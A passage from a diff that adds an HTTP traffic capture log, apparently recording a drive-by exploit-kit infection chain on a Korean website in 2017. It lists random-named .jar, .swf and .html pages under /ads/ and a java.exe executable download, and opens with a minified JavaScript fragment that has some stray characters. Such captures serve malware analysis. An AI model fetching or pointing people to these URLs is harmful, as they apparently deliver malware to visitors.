u,h,s,r;r=0+w*a;s=0+(r>>>16);s+=d*a;h=0+(s>>>16);s=(s&65535)+w*p;h+=s>>>16;s&=65535;h+=c*a;u=0+(h>>>16);h=(h&65535)+d*p;u+=h>>>16;h&=65535;h+=w*m;u+=h>>>16;h&=65535;u=u+(b*a+c*p+d*m+w*f)&65535;return e(s<<.16|r&65535,u<<16|h,this.unsigned)};b.mul=b.multiply;b.divide=function(a){g(a)||(a=q(a));if(a.isZero())throw Error("division by zero");if(this.isZero())return this.unsigned?p:k;var b,c,d;if(this.unsigned){a.unsigned||(a=a.toUnsigned());if(a.gt(this))return p;if(a.gt(this.shru(1)))return G;d=p}else{if(this.eq(l)){if(a.eq(r)||a.eq(y))return l;if(a.eq(l))return r;b=this.shr(1).div(a).shl(1);if(b.eq(k))return a.isNegative()?r:y;c=this.sub(a.mul(b));return d=b.add(c.div(a))}if(a.eq(l))return this.unsigned?.p:k;if(this.isNegative())return a.isNegative()?this.neg().div(a.neg()):this.neg().div(a).neg();if(a.isNegative())return this.div(a.neg()).neg();d=k}for(c=this;c.gte(a);){b=Math.max(1,Math.floor(c.toNumber()/a.toNumber()));for(var e=Math.ceil(Math.log(b)/Math.LN2),e=48>=e?1:v(2,e-48),f=n(b),m=f.mul(a);m.isNegative()||m.gt(c);)b-=e,f=n(b,this.unsigned),m=f.mul(a);f.isZero()&&(f=r);d=d.add(f);c=c.sub(m)}return d};b.div=b.divide;b.modulo=function(a){g(a)||(a=q(a));return this.sub(this.div(a).mul(a))};.b.mod=b.modulo;b.not=function(){return e(~this.low,~this.high,this.unsigned)};b.and=function(a){g(a)||(a=q(a));return e(this.low&a.low,this.high&a.high,this.unsigned)};b.or=function(a){g(a)||(a=q(a));return e(this.low|a.low,this.high|a.high,this.unsigned)};b.xor=function(a){g(a)||(a=q(a));return e(this.low^a.low,this.high^a.high,this.unsigned)};b.shiftLeft=function(a){g(a)&&(a=a.toInt());return 0===(a&=63)?this:32>a?e(this.low<<a,this.high<<a|this.low>>>32-a,this.unsigned):e(0,this.low<<a-32,this.unsigned)};.b.shl=b.shiftLeft;b.shiftRight=function(a){g(a)&&(a=a.toInt());return 0===(a&=63)?this:32>a?e(this.low>>>a|this.high<<32-a,this.high>>a,this.unsigned):e(this.high>>a-32,0<=this.high?0:-1,this.unsigned)};b.shr=b.shiftRight;b.shiftRightUnsigned=function(a){g(a)&&(a=a.toInt());a&=63;if(0===a)return this;var b=this.high;return 32>a?e(this.low>>>a|b<<32-a,b>>>a,this.unsigned):32===a?e(b,0,this.unsigned):e(b>>>a-32,0,this.unsigned)};b.shru=b.shiftRightUnsigned;b.toSigned=function(){return this.unsigned?.e(this.low,this.high,!1):this};b.toUnsigned=function(){return this.unsigned?this:e(this.low,this.high,!0)};b.toBytes=function(a){return a?this.toBytesLE():this.toBytesBE()};b.toBytesLE=function(){var a=this.high,b=this.low;return[b&255,b>>>8&255,b>>>16&255,b>>>24&255,a&255,a>>>8&255,a>>>16&255,a>>>24&255]};b.toBytesBE=function(){var a=this.high,b=this.low;return[a>>>24&255,a>>>16&255,a>>>8&255,a&255,b>>>24&255,b>>>16&255,b>>>8&255,b&255]};return d});.
+]]></text>
+			<mimeType>application/javascript</mimeType>
+		</content>
+	</response>
+	<cache>
+		<beforeRequest>
+			<URLInCache>false</URLInCache>
+		</beforeRequest>
+		<afterRequest>
+			<URLInCache>true</URLInCache>
+			<lastModification>2017-01-18T14:01:42</lastModification>
+			<lastCacheUpdate>2017-01-19T03:00:38</lastCacheUpdate>
+			<lastAccess>2017-01-19T03:00:36.143</lastAccess>
+			<eTag>&quot;19c0d7e-1e40-5465edb367e47&quot;</eTag>
+			<hitCount>1</hitCount>
+		</afterRequest>
+	</cache>
+	<timings>
+		<blocked started="0.000">0.020</blocked>
+		<connect started="0.020">0.011</connect>
+		<send started="0.032">0.000</send>
+		<wait started="0.032">0.015</wait>
+		<receive started="0.047">0.000</receive>
+		<ttfb started="0.020">0.027</ttfb>
+		<network started="0.020">0.027</network>
+	</timings>
+</entry>
+<entry method="GET" URL="http://www.joongohwamoolcha.com/apps/java.exe">
+	<pageref idref="page_14" />
+	<started>00:56:51.467</started>
+	<startedDateTime>2017-01-19T12:01:45.070</startedDateTime>
+	<time>0.294</time>
+	<sent>306</sent>
+	<received>363990</received>	<result>200</result>
+	<overview>
+		<action name="Display URL" status="Completed">Normal browser lookup of URL http://www.joongohwamoolcha.com/apps/java.exe</action>
+		<action name="Started At" status="Completed">2017-Jan-19 12:01:45.070 (local time)</action>
+		<action name="Connect" status="Completed">Connect to IP address &apos;211.115.80.22&apos;</action>
+		<action name="HTTP Request" status="Completed">Unconditional request sent for http://www.joongohwamoolcha.com/apps/java.exe</action>
+		<action name="HTTP Response" status="Completed">Headers and content returned</action>
+	</overview>
+	<request>
+		<requestMethod>GET /apps/java.exe HTTP/1.1</requestMethod>
+		<cookies></cookies>
+		<headers>
+			<header name="Accept">image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*</header>
+			<header name="Accept-Encoding">gzip, deflate</header>
+			<header name="Accept-Language">ko</header>
+			<header name="Connection">Keep-Alive</header>
+			<header name="Host">www.joongohwamoolcha.com</header>
+			<header name="User-Agent">Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)</header>
+		</headers>
+	</request>
+	<response>
+		<responseStatus>HTTP/1.1 200 OK</responseStatus>
+		<cookies></cookies>
+		<headers>
+			<header name="Accept-Ranges">bytes</header>
+			<header name="Connection">Keep-Alive</header>
+			<header name="Content-Length">363681</header>
+			<header name="Content-Type">application/x-msdownload</header>
+			<header name="Date">Thu, 19 Jan 2017 03:01:44 GMT</header>
+			<header name="ETag">&quot;19c07e6-58ca1-5466184230587&quot;</header>
+			<header name="Keep-Alive">timeout=15, max=100</header>
+			<header name="Last-Modified">Wed, 18 Jan 2017 17:12:06 GMT</header>
+			<header name="Server">Microsoft-IIS/5.0</header>
+		</headers>
+		<content>
+			<contentLength>363681</contentLength>
+			<mimeType>application/x-msdownload</mimeType>
+		</content>
+	</response>
+	<cache>
+		<beforeRequest>
+			<URLInCache>true</URLInCache>
+			<lastModification>2017-01-18T17:12:06</lastModification>
+			<lastCacheUpdate>2017-01-19T02:04:56</lastCacheUpdate>
+			<lastAccess>2017-01-19T02:04:54.884</lastAccess>
+			<eTag>&quot;19c07e6-58ca1-5466184230587&quot;</eTag>
+			<hitCount>2</hitCount>
+		</beforeRequest>
+		<afterRequest>
+			<URLInCache>true</URLInCache>
+			<lastModification>2017-01-18T17:12:06</lastModification>
+			<lastCacheUpdate>2017-01-19T03:01:46</lastCacheUpdate>
+			<lastAccess>2017-01-19T03:01:45.403</lastAccess>
+			<eTag>&quot;19c07e6-58ca1-5466184230587&quot;</eTag>
+			<hitCount>4</hitCount>
+		</afterRequest>
+	</cache>
+	<timings>
+		<blocked started="0.000">0.151</blocked>
+		<connect started="0.151">0.007</connect>
+		<send started="0.159">0.000</send>
+		<wait started="0.159">0.017</wait>
+		<receive started="0.176">0.117</receive>
+		<ttfb started="0.151">0.025</ttfb>
+		<network started="0.151">0.143</network>
+	</timings>
+</entry>
+<page id="page_0" title="http://www.joongohwamoolcha.com/ads/adpop.html" dynamic="false" unknown="false">
+	<started>00:00:00.000</started>
+	<startedDateTime>2017-01-19T11:04:53.603</startedDateTime>
+</page>
+<page id="page_1" title="http://www.joongohwamoolcha.com/ads/ww.html" dynamic="false" unknown="false">
+	<started>00:36:18.147</started>
+	<startedDateTime>2017-01-19T11:41:11.750</startedDateTime>
+</page>
+<page id="page_2" title="http://www.joongohwamoolcha.com/ads/LrNwXx.jar" dynamic="false" unknown="false">
+	<started>00:54:32.537</started>
+	<startedDateTime>2017-01-19T11:59:26.140</startedDateTime>
+</page>
+<page id="page_3" title="http://www.joongohwamoolcha.com/ads/IhTrFx.jar" dynamic="false" unknown="false">
+	<started>00:54:41.025</started>
+	<startedDateTime>2017-01-19T11:59:34.628</startedDateTime>
+</page>
+<page id="page_4" title="http://www.joongohwamoolcha.com/ads/EwReMw.jar" dynamic="false" unknown="false">
+	<started>00:54:47.370</started>
+	<startedDateTime>2017-01-19T11:59:40.973</startedDateTime>
+</page>
+<page id="page_5" title="http://www.joongohwamoolcha.com/ads/YrGaEs.html" dynamic="false" unknown="false">
+	<started>00:54:56.097</started>
+	<startedDateTime>2017-01-19T11:59:49.700</startedDateTime>
+</page>
+<page id="page_6" title="HTTP 404 찾을 수 없습니다." dynamic="false" unknown="false">
+	<started>00:55:01.121</started>
+	<startedDateTime>2017-01-19T11:59:54.724</startedDateTime>
+</page>
+<page id="page_7" title="http://www.joongohwamoolcha.com/ads/bin_do.swf" dynamic="false" unknown="false">
+	<started>00:55:05.577</started>
+	<startedDateTime>2017-01-19T11:59:59.180</startedDateTime>
+</page>
+<page id="page_8" title="http://www.joongohwamoolcha.com/ads/ad_do.swf" dynamic="false" unknown="false">
+	<started>00:55:09.910</started>
+	<startedDateTime>2017-01-19T12:00:03.513</startedDateTime>
+</page>
+<page id="page_9" title="HTTP 404 찾을 수 없습니다." dynamic="false" unknown="false">
+	<started>00:55:17.034</started>
+	<startedDateTime>2017-01-19T12:00:10.637</startedDateTime>
+</page>
+<page id="page_10" title="http://www.joongohwamoolcha.com/ads/ww.html" dynamic="false" unknown="false">
+	<started>00:55:26.769</started>
+	<startedDateTime>2017-01-19T12:00:20.372</startedDateTime>
+</page>
+<page id="page_11" title="http://www.joongohwamoolcha.com/ads/VoEuTs.html" dynamic="false" unknown="false">
+	<started>00:55:32.216</started>
+	<startedDateTime>2017-01-19T12:00:25.819</startedDateTime>
+</page>
+<page id="page_12" title="http://www.joongohwamoolcha.com/ads/ReJhBz.html" dynamic="false" unknown="false">
+	<started>00:55:37.633</started>
+	<startedDateTime>2017-01-19T12:00:31.236</startedDateTime>
+</page>
+<page id="page_13" title="who the fuck are you" dynamic="false" unknown="false">
+	<started>00:55:42.424</started>
+	<startedDateTime>2017-01-19T12:00:36.027</startedDateTime>
+</page>
+<page id="page_14" title="http://www.joongohwamoolcha.com/apps/java.exe" dynamic="false" unknown="false">
+	<started>00:56:51.467</started>
+	<startedDateTime>2017-01-19T12:01:45.070</startedDateTime>
+</page>
+</log>
